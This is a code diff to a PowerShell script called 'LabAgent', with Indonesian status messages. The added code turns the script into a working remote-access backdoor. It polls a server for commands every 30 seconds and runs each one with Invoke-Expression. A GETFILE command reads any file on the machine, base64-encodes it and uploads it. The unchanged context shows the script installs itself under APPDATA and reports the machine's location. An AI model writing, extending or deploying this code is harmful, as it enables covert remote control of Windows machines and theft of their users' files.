@@ -3,6 +3,7 @@ $ServerPort = "8080"
 $MachineID = "win-lab-1"
 $IntervalSec = 30
 $Endpoint = "http://" + $ServerIP + ":" + $ServerPort + "/"
+$AgentKey = ""
 
 $Install = $args -contains "-Install"
 $AgentPath = Join-Path $env:APPDATA "LabAgent\agent_windows.ps1"
@@ -238,6 +239,59 @@ function Send-OSLocation {
     }
 }
 
+function Get-Commands {
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $url = $Endpoint + "cmd?id=" + [uri]::EscapeDataString($MachineID)
+        if ($AgentKey) { $url += "&key=" + [uri]::EscapeDataString($AgentKey) }
+        $json = $wc.DownloadString($url)
+        return @($json | ConvertFrom-Json)
+    } catch {
+        return @()
+    }
+}
+
+function Invoke-LabCommand($c) {
+    $cid = $c.cid
+    $cmdline = [string]$c.cmd
+    $output = ""
+    $data = ""
+    $data_name = ""
+    if ($cmdline -match '^GETFILE\s+(.+)$') {
+        $path = $Matches[1].Trim()
+        if (Test-Path $path) {
+            $item = Get-Item $path
+            $data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
+            $data_name = $item.Name
+            $output = "[OK] File siap diunduh: $path ($([math]::Round($item.Length/1KB,1)) KB)"
+        } else {
+            $output = "[ERR] File tidak ditemukan: $path"
+        }
+    } else {
+        try {
+            $output = Invoke-Expression $cmdline 2>&1 | Out-String
+        } catch {
+            $output = "[ERR] " + $_.Exception.Message
+        }
+    }
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $body = "machine=" + [uri]::EscapeDataString($MachineID) +
+                "&cid=" + [uri]::EscapeDataString($cid) +
+                "&output=" + [uri]::EscapeDataString($output) +
+                "&data=" + [uri]::EscapeDataString($data) +
+                "&data_name=" + [uri]::EscapeDataString($data_name)
+        if ($AgentKey) { $body += "&key=" + [uri]::EscapeDataString($AgentKey) }
+        $resp = $wc.UploadString($Endpoint + "result", $body)
+        Write-Host "[+] Hasil perintah dikirim (CID $cid): $($cmdline.Substring(0, [Math]::Min(40, $cmdline.Length)))"
+    } catch {
+        Write-Host "[!] Gagal kirim hasil: $($_.Exception.Message)"
+    }
+}
+
 if ($Install) {
     try {
         $dir = Split-Path $AgentPath -Parent
@@ -294,5 +348,10 @@ while ($true) {
         $sentOnce = $true
     }
     Send-Report
+    $cmds = Get-Commands
+    foreach ($c in $cmds) {
+        Write-Host "[*] Menjalankan: $($c.cmd)"
+        Invoke-LabCommand $c
+    }
     Start-Sleep -Seconds $IntervalSec
 }
